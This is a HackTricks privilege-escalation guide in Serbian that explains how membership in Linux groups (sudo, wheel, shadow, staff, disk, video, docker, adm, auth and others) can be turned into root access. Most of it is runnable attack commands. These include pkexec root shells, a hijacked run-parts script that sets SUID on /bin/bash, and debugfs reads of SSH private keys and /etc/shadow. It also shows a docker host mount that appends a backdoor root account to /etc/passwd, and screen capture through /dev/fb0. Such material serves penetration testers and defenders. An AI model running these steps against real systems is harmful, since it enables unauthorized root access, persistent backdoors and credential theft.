# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**Ponekad**, **po defaultu (ili zato što neki softver to zahteva)** unutar **/etc/sudoers** datoteke možete pronaći neke od ovih linija:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To znači da **bilo koji korisnik koji pripada grupi sudo ili admin može izvršavati bilo šta kao sudo**.

Ako je to slučaj, da **postanete root, možete jednostavno izvršiti**:
```
sudo su
```
### PE - Metod 2

Pronađite sve suid binarne datoteke i proverite da li postoji binarna datoteka **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ako otkrijete da je binarni fajl **pkexec SUID binarni fajl** i da pripadate grupama **sudo** ili **admin**, verovatno možete izvršavati binarne fajlove kao sudo koristeći `pkexec`.\
To je zato što su obično to grupe unutar **polkit politike**. Ova politika u suštini identifikuje koje grupe mogu koristiti `pkexec`. Proverite to sa:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Tamo ćete pronaći koje grupe imaju dozvolu da izvrše **pkexec** i **po defaultu** u nekim linux distribucijama grupe **sudo** i **admin** se pojavljuju.

Da **postanete root možete izvršiti**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Nije zato što nemate dozvole, već zato što niste povezani bez GUI-a**. I postoji rešenje za ovaj problem ovde: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebne su vam **2 različite ssh sesije**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Ponekad**, **po defaultu** unutar **/etc/sudoers** datoteke možete pronaći ovu liniju:
```
%wheel	ALL=(ALL:ALL) ALL
```
To znači da **bilo koji korisnik koji pripada grupi wheel može izvršavati bilo šta kao sudo**.

Ako je to slučaj, da **postanete root, možete jednostavno izvršiti**:
```
sudo su
```
## Shadow Group

Korisnici iz **grupe shadow** mogu **čitati** **/etc/shadow** datoteku:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, pročitajte datoteku i pokušajte da **provalite neke heševe**.

## Grupa osoblja

**staff**: Omogućava korisnicima da dodaju lokalne izmene u sistem (`/usr/local`) bez potrebe za root privilegijama (napomena da su izvršne datoteke u `/usr/local/bin` u PATH varijabli bilo kog korisnika, i mogu "prebrisati" izvršne datoteke u `/bin` i `/usr/bin` sa istim imenom). Uporedite sa grupom "adm", koja je više povezana sa nadzorom/bezbednošću. [\[source\]](https://wiki.debian.org/SystemGroups)

U debian distribucijama, `$PATH` varijabla pokazuje da će `/usr/local/` biti pokrenut kao najviši prioritet, bez obzira da li ste privilegovani korisnik ili ne.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ako možemo preuzeti neke programe u `/usr/local`, možemo lako dobiti root.

Preuzimanje `run-parts` programa je jednostavan način da dobijemo root, jer će većina programa pokrenuti `run-parts` kao (crontab, kada se prijavljujete putem ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ili Kada se prijavi nova ssh sesija.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Eksploatacija**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Ova privilegija je gotovo **ekvivalentna root pristupu** jer možete pristupiti svim podacima unutar mašine.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Napomena da pomoću debugfs možete takođe **pisati fajlove**. Na primer, da kopirate `/tmp/asd1.txt` u `/tmp/asd2.txt` možete uraditi:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Međutim, ako pokušate da **pišete datoteke koje su u vlasništvu root-a** (kao što su `/etc/shadow` ili `/etc/passwd`), dobićete grešku "**Permission denied**".

## Video Grupa

Korišćenjem komande `w` možete saznati **ko je prijavljen na sistem** i prikazaće izlaz kao što je sledeći:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** znači da je korisnik **yossi fizički prijavljen** na terminalu na mašini.

**video grupa** ima pristup za pregled izlaza sa ekrana. U suštini, možete posmatrati ekrane. Da biste to uradili, potrebno je da **uhvatite trenutnu sliku na ekranu** u sirovim podacima i dobijete rezoluciju koju ekran koristi. Podaci sa ekrana mogu se sačuvati u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći na `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Da biste **otvorili** **sirovu sliku**, možete koristiti **GIMP**, odabrati **`screen.raw`** datoteku i odabrati tip datoteke **Raw image data**:

![](<../../../images/image (463).png>)

Zatim modifikujte Širinu i Visinu na one koje koristi ekran i proverite različite Tipove slika (i odaberite onaj koji bolje prikazuje ekran):

![](<../../../images/image (317).png>)

## Root Grupa

Izgleda da po defaultu **članovi root grupe** mogu imati pristup da **modifikuju** neke **konfiguracione** datoteke **usluga** ili neke **biblioteke** ili **druge zanimljive stvari** koje bi mogle biti korišćene za eskalaciju privilegija...

**Proverite koje datoteke članovi root grupe mogu modifikovati**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Grupa

Možete **montirati root datotečni sistem host mašine na volumen instance**, tako da kada se instanca pokrene, odmah učitava `chroot` u taj volumen. Ovo vam efektivno daje root pristup na mašini.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Na kraju, ako vam se ne sviđaju neki od prethodnih predloga, ili ne rade iz nekog razloga (docker api firewall?), uvek možete pokušati da **pokrenete privilegovanu kontejner i pobegnete iz njega** kao što je objašnjeno ovde:

{{#ref}}
../docker-security/
{{#endref}}

Ako imate dozvole za pisanje preko docker socket-a, pročitajte [**ovaj post o tome kako eskalirati privilegije zloupotrebom docker socket-a**](../index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Grupa

{{#ref}}
./
{{#endref}}

## Adm Grupa

Obično **članovi** grupe **`adm`** imaju dozvole da **čitaju log** fajlove smeštene unutar _/var/log/_.\
Stoga, ako ste kompromitovali korisnika unutar ove grupe, definitivno biste trebali da **pogledate logove**.

## Auth grupa

Unutar OpenBSD, **auth** grupa obično može da piše u foldere _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
Ove dozvole se mogu zloupotrebiti sa sledećim exploitom da bi se **eskalirale privilegije** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
